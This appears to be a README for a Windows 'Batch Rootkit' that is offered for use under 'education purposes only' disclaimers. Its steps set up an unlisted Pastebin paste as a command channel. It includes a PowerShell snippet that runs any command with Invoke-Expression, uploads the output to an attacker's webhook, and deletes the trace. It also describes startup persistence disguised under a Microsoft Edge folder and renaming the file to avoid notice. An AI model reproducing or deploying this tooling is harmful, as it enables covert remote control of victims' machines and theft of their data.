# Batch Rootkit

> __Warning__ 
> **I hereby declare that I am not liable for any damages caused by the program. If you experience any problems with my code, feel free to reach out to me on Discord.**

> __Warning__ 
> **The distribution of this computer virus onto computers other than one's own is a criminal offense, and such action is strictly prohibited.**

> __Warning__ 
> **ITS EDUCATION PURPOSES ONLY**

## Contact
In case you require any assistance with my project, please do not hesitate to contact me on Discord.
**Code613 on discord**

## About project
Batch rootkit is using pastebin to control computer powershell. Nowadays, the code can be easily removed, and the link to Pastebin and commands can be readily accessible.

## How to use
1. Create account on Create paste on https://pastebin.com/
2. Create paste on https://pastebin.com/
3. Make paste to unlisted
4. Change your webhook url and commend that you want to use
```PowerShell
$webhookUrl = "Your webhook url"
$outputFile = "output.txt"
$command = "Commend you want to use"
Invoke-Expression "$command | Out-File -FilePath $outputFile"
#tasklist | Out-File -FilePath $outputFile
$client = New-Object System.Net.WebClient
$client.UploadFile($webhookUrl, $outputFile)
Remove-Item $outputFile
 ```
5. To use cmd commend use ```cmd /c```  to use powershell commend just use your commend without ```cmd /c```
6. Save your paste
7. Press raw button
8. Copy link
9. Paste this link into batch code
10. Change name of rootkit.bat to anything you want
11. Done
12. Now application will run on startup and will be stored in %localappdata%/Microsoft Edge

## Rules
**IMPORTANT: ITS ROOTKIT SOFTWARE**
1. This software is a rootkit intended solely for educational purposes. Using, distributing, or modifying this software in a manner that violates applicable laws is strictly prohibited.
2. Rootkit software is potentially harmful and infringes upon the privacy, security, and rights of computer users. Using this software to gain unauthorized access to systems, carry out attacks, steal data, or engage in any other illegal activities is unlawful and unethical.
3. The creators and contributors of this rootkit software do not endorse or support any illegal or malicious use of the software. The use of this software is entirely at your own risk, and you assume full responsibility for any consequences that may arise from its use.
4. By using or accessing this rootkit software, you agree to abide by all applicable laws and regulations. The creators and contributors of this software are not liable for any damages or legal repercussions resulting from the use or misuse of this software.
5. Please ensure that you use this software responsibly and ethically, respecting the privacy and security of others.
6. BY DOWNLOADING THIS MALWARE YOU ACCEPT ALL RULES
